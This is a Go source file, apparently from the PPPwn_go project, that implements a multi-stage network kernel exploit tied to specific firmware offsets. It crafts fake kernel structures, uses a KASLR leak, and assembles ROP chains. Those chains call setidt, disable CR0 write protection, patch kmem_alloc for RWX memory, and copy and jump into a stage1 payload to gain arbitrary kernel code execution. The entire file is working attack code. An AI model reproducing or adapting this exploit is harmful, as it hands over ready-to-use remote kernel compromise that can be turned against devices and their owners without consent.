package exploit

import (
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"os"

	"github.com/wetor/PPPwn_go/internal/config"
	"github.com/wetor/PPPwn_go/internal/errors"
	"github.com/wetor/PPPwn_go/internal/logger"
	"github.com/wetor/PPPwn_go/internal/packet"
	"github.com/wetor/PPPwn_go/internal/utils"
)

type Exploit struct {
	ctx             context.Context
	injectTargetMac net.HardwareAddr
	offs            *Offset
	iface           string
	stage1          []byte
	stage2          []byte

	p *packet.Packet

	kaslrOffset uint64
	pppoeSoftc  uint64

	pppoeSoftcList uint64

	targetMac net.HardwareAddr
	sourceMac net.HardwareAddr

	targetIPv6 net.IP
}

type Option struct {
	Interface string
	Inject    *config.Inject
}

func NewExploit(opts *Option) *Exploit {
	stage1Data, err := os.ReadFile(opts.Inject.Stage1File)
	if err != nil {
		logger.Fatal(err)
	}
	stage2Data, err := os.ReadFile(opts.Inject.Stage2File)
	if err != nil {
		logger.Fatal(err)
	}

	offs, ok := FirmwareOffsets[opts.Inject.Firmware]
	if !ok {
		logger.Fatalf("fw '%s' not supported, supported firmwares %v", opts.Inject.Firmware, SupportedFirmware)
	}

	e := &Exploit{
		ctx:             context.Background(),
		injectTargetMac: nil,
		offs:            offs,
		iface:           opts.Interface,
		stage1:          stage1Data,
		stage2:          stage2Data,
	}
	if opts.Inject.TargetMAC != "" {
		e.injectTargetMac, err = net.ParseMAC(opts.Inject.TargetMAC)
		if err != nil {
			logger.Fatal(err)
		}
	}

	e.p = packet.NewPacket(e.iface, BPF_FILTER)
	return e
}

func (e *Exploit) kdlsym(addr uint64) uint64 {
	return e.kaslrOffset + addr
}

func (e *Exploit) Run() {
	var err error
	LcpEchoHandler(e.ctx, e.iface)

	fmt.Println()
	logger.Infof("[+] STAGE 0: Initialization")
	err = e.runStage0()
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println()
	logger.Infof("[+] STAGE 1: Memory corruption")
	err = e.runStage1()
	if err != nil {
		if err == errors.ScanningCorruptedFailedError {
			os.Exit(1)
		}
		log.Fatal(err)
	}

	fmt.Println()
	logger.Infof("[+] STAGE 2: KASLR defeat")
	err = e.runStage2()
	if err != nil {
		if err == errors.KASLRLeakInvalidError {
			os.Exit(1)
		}
		log.Fatal(err)
	}

	fmt.Println()
	logger.Infof("[+] STAGE 3: Remote code execution")
	err = e.runStage3()
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println()
	logger.Infof("[+] STAGE 4: Arbitrary payload execution")
	err = e.runStage4()
	if err != nil {
		log.Fatal(err)
	}
}

func (e *Exploit) BuildFakeIfnet() []byte {
	// Leak address
	// Upper bytes are encoded with SESSION_ID
	planted := (e.pppoeSoftc + 0x07) & 0xffffffffffff
	e.sourceMac = utils.ToBytes(planted, 6, binary.LittleEndian)
	logger.Infof("[+] Source MAC: %s", e.sourceMac.String())

	var fakeIfnet bytes.Buffer

	fakeIfnet.Write(bytes.Repeat([]byte("A"), 0x48-fakeIfnet.Len()))
	fakeIfnet.Write(utils.P64(0)) // if_addrhead
	fakeIfnet.Write(bytes.Repeat([]byte("A"), 0x70-fakeIfnet.Len()))
	fakeIfnet.Write(utils.P16(0x0001)) // if_index
	fakeIfnet.Write(bytes.Repeat([]byte("A"), 0xa0-fakeIfnet.Len()))
	fakeIfnet.Write(utils.P8(IFT_ETHER)) // ifi_type
	fakeIfnet.Write(utils.P8(0))         // ifi_physical
	fakeIfnet.Write(utils.P8(0x8 + 0x1)) // ifi_addrlen
	fakeIfnet.Write(bytes.Repeat([]byte("A"), 0x1b8-fakeIfnet.Len()))
	fakeIfnet.Write(utils.P64(e.pppoeSoftc + PPPOE_SOFTC_SC_DEST)) // if_addr
	fakeIfnet.Write(bytes.Repeat([]byte("A"), 0x428-fakeIfnet.Len()))
	fakeIfnet.Write(utils.P64(e.pppoeSoftc + 0x10 - 0x8)) // nd_ifinfo

	// if_afdata_lock
	fakeIfnet.Write(bytes.Repeat([]byte("A"), 0x480-fakeIfnet.Len()))
	fakeIfnet.Write(utils.P64(0))             // lo_name
	fakeIfnet.Write(utils.P32(RW_INIT_FLAGS)) // lo_flags
	fakeIfnet.Write(utils.P32(0))             // lo_data
	fakeIfnet.Write(utils.P64(0))             // lo_witness
	fakeIfnet.Write(utils.P64(RW_UNLOCKED))   // rw_lock

	// if_addr_mtx
	fakeIfnet.Write(bytes.Repeat([]byte("A"), 0x4c0-fakeIfnet.Len()))
	fakeIfnet.Write(utils.P64(0))              // lo_name
	fakeIfnet.Write(utils.P32(MTX_INIT_FLAGS)) // lo_flags
	fakeIfnet.Write(utils.P32(0))              // lo_data
	fakeIfnet.Write(utils.P64(0))              // lo_witness
	fakeIfnet.Write(utils.P64(MTX_UNOWNED))    // mtx_lock

	return fakeIfnet.Bytes()
}

func (e *Exploit) BuildOverflowLle() []byte {
	// Fake in6_llentry
	var overflowLle bytes.Buffer

	// lle_next
	overflowLle.Write(utils.P64(e.pppoeSoftc + PPPOE_SOFTC_SC_AC_COOKIE)) // le_next
	overflowLle.Write(utils.P64(0))                                       // le_prev

	// lle_lock
	overflowLle.Write(utils.P64(0))                        // lo_name
	overflowLle.Write(utils.P32(RW_INIT_FLAGS | LO_DUPOK)) // lo_flags
	overflowLle.Write(utils.P32(0))                        // lo_data
	overflowLle.Write(utils.P64(0))                        // lo_witness
	overflowLle.Write(utils.P64(RW_UNLOCKED))              // rw_lock

	overflowLle.Write(utils.P64(e.pppoeSoftc + PPPOE_SOFTC_SC_AC_COOKIE - LLTABLE_LLTIFP)) // lle_tbl
	overflowLle.Write(utils.P64(0))                                                        // lle_head
	overflowLle.Write(utils.P64(0))                                                        // lle_free
	overflowLle.Write(utils.P64(0))                                                        // la_hold
	overflowLle.Write(utils.P32(0))                                                        // la_numheld
	overflowLle.Write(utils.P32(0))                                                        // pad
	overflowLle.Write(utils.P64(0))                                                        // la_expire
	overflowLle.Write(utils.P16(LLE_EXCLUSIVE))                                            // la_flags
	overflowLle.Write(utils.P16(0))                                                        // la_asked
	overflowLle.Write(utils.P16(0))                                                        // la_preempt
	overflowLle.Write(utils.P16(0))                                                        // ln_byhint
	overflowLle.Write(utils.P16(ND6_LLINFO_NOSTATE))                                       // ln_state
	overflowLle.Write(utils.P16(0))                                                        // ln_router
	overflowLle.Write(utils.P32(0))                                                        // pad
	overflowLle.Write(utils.P64(0x7fffffffffffffff))                                       // ln_ntick

	return overflowLle.Bytes()
}

func (e *Exploit) BuildFakeLle() []byte {
	// First gadget - must be a valid MAC address
	// Upper bytes are encoded with SESSION_ID
	planted := e.kdlsym(e.offs.FIRST_GADGET) & 0xffffffffffff
	e.sourceMac = utils.ToBytes(planted, 6, binary.LittleEndian)
	logger.Infof("[+] Source MAC: %s", e.sourceMac.String())
	// Fake in6_llentry
	var fakeLle bytes.Buffer

	// lle_next
	// Third gadget
	fakeLle.Write(utils.P64(e.kdlsym(e.offs.POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10))) // le_next
	fakeLle.Write(utils.P64(NULL))                                                          // le_prev

	// lle_lock
	// Fourth gadget
	fakeLle.Write(utils.P64(e.kdlsym(e.offs.LEA_RSP_RSI_20_REPZ_RET))) // lo_name
	fakeLle.Write(utils.P32(RW_INIT_FLAGS | LO_DUPOK))                 // lo_flags
	fakeLle.Write(utils.P32(0))                                        // lo_data
	// Fifth gadget
	fakeLle.Write(utils.P64(e.kdlsym(e.offs.ADD_RSP_B0_POP_RBP_RET))) // lo_witness
	fakeLle.Write(utils.P64(RW_UNLOCKED))                             // rw_lock

	fakeLle.Write(utils.P64(e.pppoeSoftc + PPPOE_SOFTC_SC_DEST - LLTABLE_LLTFREE)) // lle_tbl
	fakeLle.Write(utils.P64(NULL))                                                 // lle_head
	fakeLle.Write(utils.P64(NULL))                                                 // lle_free
	fakeLle.Write(utils.P64(NULL))                                                 // la_hold
	fakeLle.Write(utils.P32(0))                                                    // la_numheld
	fakeLle.Write(utils.P32(0))                                                    // pad
	fakeLle.Write(utils.P64(0))                                                    // la_expire
	fakeLle.Write(utils.P16(LLE_STATIC | LLE_EXCLUSIVE))                           // la_flags
	fakeLle.Write(utils.P16(0))                                                    // la_asked
	fakeLle.Write(utils.P16(0))                                                    // la_preempt
	fakeLle.Write(utils.P16(0))                                                    // ln_byhint
	fakeLle.Write(utils.P16(ND6_LLINFO_NOSTATE))                                   // ln_state
	fakeLle.Write(utils.P16(0))                                                    // ln_router
	fakeLle.Write(utils.P32(0))                                                    // pad
	fakeLle.Write(utils.P64(0x7fffffffffffffff))                                   // ln_ntick
	fakeLle.Write(utils.P32(0))                                                    // lle_refcnt
	fakeLle.Write(utils.P32(0))                                                    // pad
	fakeLle.Write(utils.P64be(0x414141414141))                                     // ll_addr

	// lle_timer
	fakeLle.Write(utils.P64(0))                      // sle
	fakeLle.Write(utils.P64(0))                      // tqe
	fakeLle.Write(utils.P32(0))                      // c_time
	fakeLle.Write(utils.P32(0))                      // pad
	fakeLle.Write(utils.P64(NULL))                   // c_arg
	fakeLle.Write(utils.P64(NULL))                   // c_func
	fakeLle.Write(utils.P64(NULL))                   // c_lock
	fakeLle.Write(utils.P32(CALLOUT_RETURNUNLOCKED)) // c_flags
	fakeLle.Write(utils.P32(0))                      // c_cpu

	// l3_addr6
	fakeLle.Write(utils.P8(SOCKADDR_IN6_SIZE)) // sin6_len
	fakeLle.Write(utils.P8(AF_INET6))          // sin6_family
	fakeLle.Write(utils.P16(0))                // sin6_port
	fakeLle.Write(utils.P32(0))                // sin6_flowinfo
	// sin6_addr
	fakeLle.Write(utils.P64be(0xfe80000100000000))
	fakeLle.Write(utils.P64be(0x4141414141414141))
	fakeLle.Write(utils.P32(0)) // sin6_scope_id

	// pad
	fakeLle.Write(utils.P32(0))

	//fakeLle[e.offs.SECOND_GADGET_OFF : e.offs.SECOND_GADGET_OFF+8] = P64(e.kdlsym(e.offs.PUSH_RBP_JMP_QWORD_PTR_RSI))

	// Second gadget
	fakeLleBytes := fakeLle.Bytes()
	var fakeLleResult bytes.Buffer
	fakeLleResult.Write(fakeLleBytes[:e.offs.SECOND_GADGET_OFF])
	fakeLleResult.Write(utils.P64(e.kdlsym(e.offs.PUSH_RBP_JMP_QWORD_PTR_RSI)))
	fakeLleResult.Write(fakeLleBytes[e.offs.SECOND_GADGET_OFF+8:])

	// Second ROP chain
	rop2 := e.buildSecondRop()
	// First ROP chain
	rop := e.buildFirstRop(fakeLleResult.Bytes(), rop2)

	fakeLleResult.Write(rop)
	fakeLleResult.Write(rop2)
	fakeLleResult.Write(e.stage1)
	return fakeLleResult.Bytes()
}

func (e *Exploit) buildFirstRop(fake_lle, rop2 []byte) []byte {
	var rop bytes.Buffer
	// memcpy(RBX - 0x800, rop2, len(rop2 + stage1))

	// RDI = RBX - 0x800
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_R12_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RBP_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.MOV_RDI_RBX_CALL_R12)))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RCX_RET)))
	a := int64(-0x800)
	rop.Write(utils.P64(uint64(a)))
	rop.Write(utils.P64(e.kdlsym(e.offs.ADD_RDI_RCX_RET)))

	// RSI += len(fake_lle + rop)
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RDX_RET)))
	ropOffFixup := rop.Len()
	rop.Write(utils.P64(0xDEADBEEF))
	rop.Write(utils.P64(e.kdlsym(e.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET)))
	rop.Write(utils.P64(0xDEADBEEF))

	// RDX = len(rop2 + stage1)
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RDX_RET)))
	rop.Write(utils.P64(uint64(len(rop2) + len(e.stage1))))

	// Call memcpy
	rop.Write(utils.P64(e.kdlsym(e.offs.MEMCPY)))

	// Stack pivot
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RAX_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RBP_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.MOV_RSI_RBX_CALL_RAX)))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RDX_RET)))
	rop.Write(utils.P64(0x800 + 0x20))
	rop.Write(utils.P64(e.kdlsym(e.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET)))
	rop.Write(utils.P64(0xDEADBEEF))
	rop.Write(utils.P64(e.kdlsym(e.offs.LEA_RSP_RSI_20_REPZ_RET)))
	// rop[ropOffFixup : ropOffFixup+8] = P64(-len(fakeLle+rop))
	// Fixup offset of rop2
	ropBytes := rop.Bytes()
	var ropResult bytes.Buffer
	ropResult.Write(ropBytes[:ropOffFixup])
	ropResult.Write(utils.P64(uint64(-int64(len(fake_lle) + len(ropBytes)))))
	ropResult.Write(ropBytes[ropOffFixup+8:])
	return ropResult.Bytes()
}

func (e *Exploit) buildSecondRop() []byte {
	var rop bytes.Buffer

	// setidt(IDT_UD, handler, SDT_SYSIGT, SEL_KPL, 0)
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RDI_RET)))
	rop.Write(utils.P64(IDT_UD))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RSI_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.ADD_RSP_28_POP_RBP_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RDX_RET)))
	rop.Write(utils.P64(SDT_SYSIGT))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RCX_RET)))
	rop.Write(utils.P64(SEL_KPL))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_R8_POP_RBP_RET)))
	rop.Write(utils.P64(0))
	rop.Write(utils.P64(0xDEADBEEF))
	rop.Write(utils.P64(e.kdlsym(e.offs.SETIDT)))

	// Disable write protection
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RSI_RET)))
	rop.Write(utils.P64(CR0_ORI & ^CR0_WP))
	rop.Write(utils.P64(e.kdlsym(e.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET)))

	// Enable RWX in kmem_alloc
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RAX_RET)))
	rop.Write(utils.P64(VM_PROT_ALL))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RCX_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.KMEM_ALLOC_PATCH1)))
	rop.Write(utils.P64(e.kdlsym(e.offs.MOV_BYTE_PTR_RCX_AL_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RCX_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.KMEM_ALLOC_PATCH2)))
	rop.Write(utils.P64(e.kdlsym(e.offs.MOV_BYTE_PTR_RCX_AL_RET)))

	// Restore write protection
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RSI_RET)))
	rop.Write(utils.P64(CR0_ORI))
	rop.Write(utils.P64(e.kdlsym(e.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET)))

	// kmem_alloc(*kernel_map, PAGE_SIZE)

	// RDI = *kernel_map
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RAX_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RDI_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.KERNEL_MAP)))
	rop.Write(utils.P64(e.kdlsym(e.offs.MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX)))
	rop.Write(utils.P64(0xDEADBEEF))

	// RSI = PAGE_SIZE
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RSI_RET)))
	rop.Write(utils.P64(PAGE_SIZE))

	// Call kmem_alloc
	rop.Write(utils.P64(e.kdlsym(e.offs.KMEM_ALLOC)))

	// R14 = RAX
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_R8_POP_RBP_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RBP_RET)))
	rop.Write(utils.P64(0xDEADBEEF))
	rop.Write(utils.P64(e.kdlsym(e.offs.MOV_R14_RAX_CALL_R8)))

	// memcpy(R14, stage1, len(stage1))

	// RDI = R14
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_R12_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RBP_RET)))
	rop.Write(utils.P64(e.kdlsym(e.offs.MOV_RDI_R14_CALL_R12)))

	// RSI = RSP + len(rop) - rop_rsp_pos
	rop.Write(utils.P64(e.kdlsym(e.offs.PUSH_RSP_POP_RSI_RET)))
	ropRspPos := rop.Len()
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RDX_RET)))
	ropOffFixup := rop.Len()
	rop.Write(utils.P64(0xDEADBEEF))
	rop.Write(utils.P64(e.kdlsym(e.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET)))
	rop.Write(utils.P64(0xDEADBEEF))

	// RDX = len(stage1)
	rop.Write(utils.P64(e.kdlsym(e.offs.POP_RDX_RET)))
	rop.Write(utils.P64(uint64(len(e.stage1))))

	// Call memcpy
	rop.Write(utils.P64(e.kdlsym(e.offs.MEMCPY)))

	// Jump into stage1
	rop.Write(utils.P64(e.kdlsym(e.offs.JMP_R14)))

	// rop[ropOffFixup : ropOffFixup+8] = P64(-(len(rop) - ropRspPos))
	// Fixup offset of stage1
	ropBytes := rop.Bytes()
	var ropResult bytes.Buffer
	ropResult.Write(ropBytes[:ropOffFixup])
	ropResult.Write(utils.P64(uint64(-int64(len(ropBytes) - ropRspPos))))
	ropResult.Write(ropBytes[ropOffFixup+8:])
	return ropResult.Bytes()
}
